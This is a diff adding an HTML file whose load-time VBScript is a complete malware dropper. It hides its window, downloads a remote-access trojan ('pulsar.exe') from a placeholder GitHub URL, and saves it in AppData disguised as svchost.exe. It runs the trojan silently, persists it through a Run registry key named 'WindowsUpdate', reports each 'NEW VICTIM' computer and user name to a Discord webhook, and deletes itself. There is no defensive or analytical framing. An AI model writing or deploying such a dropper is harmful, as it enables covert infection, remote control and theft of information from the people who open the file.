@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script language="VBScript">
+Sub Window_OnLoad
+    Window.ResizeTo 0,0
+    Window.MoveTo -2000,-2000
+    
+    Dim shell, fso, http, stream, ratPath, webhook, data
+    
+    webhook = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
+    ratURL = "https://raw.githubusercontent.com/YOUR_USERNAME/rat/main/pulsar.exe"
+    
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    On Error Resume Next
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.open "GET", ratURL, False
+    http.send
+    
+    If http.Status = 200 Then
+        ratPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\svchost.exe"
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.responseBody
+        stream.SaveToFile ratPath, 2
+        stream.Close
+        
+        shell.Run """" & ratPath & """", 0, False
+        
+        shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", ratPath
+        
+        data = "**🔴 NEW VICTIM**" & vbCrLf & _
+               "**Computer:** " & CreateObject("WScript.Network").ComputerName & vbCrLf & _
+               "**User:** " & CreateObject("WScript.Network").UserName
+        Set http = CreateObject("MSXML2.XMLHTTP")
+        http.open "POST", webhook, False
+        http.setRequestHeader "Content-Type", "application/json"
+        http.send "{""content"": """ & Replace(data, vbCrLf, "\\n") & """}"
+    End If
+    
+    fso.DeleteFile Window.Location.Path
+    Window.Close
+End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
